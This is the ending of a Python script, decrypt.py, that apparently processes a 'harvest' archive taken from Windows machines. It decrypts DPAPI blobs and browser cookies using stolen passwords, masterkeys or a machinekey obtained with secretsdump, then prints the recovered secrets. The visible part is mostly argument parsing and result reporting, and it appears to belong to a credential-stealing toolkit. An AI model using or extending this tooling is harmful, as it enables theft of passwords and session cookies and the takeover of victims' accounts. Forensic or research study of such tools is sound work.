    summary = "\n".join(f"{k:10} {v}" for k, v in harvest.counts.items())
    write(out, "summary.txt", summary + "\n")

    title("done")
    for key, value in harvest.counts.items():
        (ok if value else skipped)(f"{key}: {value}")
    p()
    p(f"  output: {out}", "dim")
    if not any(harvest.counts.values()) and sids:
        warn("nothing was decrypted", "rerun with -p '<windows password>'")
    elif harvest.counts["cookies"] == 0 and sids:
        warn("no cookies decrypted", "supply -p (and --system-masterkey for v20)")
    if temp:
        shutil.rmtree(temp, ignore_errors=True)


def parse_args():
    import argparse
    parser = argparse.ArgumentParser(
        prog="decrypt.py", description="Decrypt a Server Pack Core harvest.",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    parser.add_argument("archive", help="harvest .zip or extracted directory")
    parser.add_argument("-o", "--out", help="output directory (default: decrypted-<name>)")
    parser.add_argument("-p", "--password", help="Windows password for the DPAPI blobs")
    parser.add_argument("--masterkey", help="user DPAPI masterkey in hex")
    parser.add_argument("--system-masterkey", help="SYSTEM DPAPI masterkey in hex (v20 cookies)")
    parser.add_argument("--machinekey",
                        help="DPAPI_SYSTEM machinekey from secretsdump (20 bytes hex); "
                             "derives the S-1-5-18 masterkeys")
    parser.add_argument("--system-protect",
                        help="copied S-1-5-18 Protect folder (default: inside the harvest)")
    parser.add_argument("--list", action="store_true", help="inventory only, decrypt nothing")
    parser.add_argument("-s", "--show", type=int, default=4, help="secrets printed on screen")
    parser.add_argument("-q", "--quiet", action="store_true", help="do not prompt")
    parser.add_argument("--no-color", action="store_true")
    return parser.parse_args()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        p("\n  aborted", "red")
        sys.exit(130)
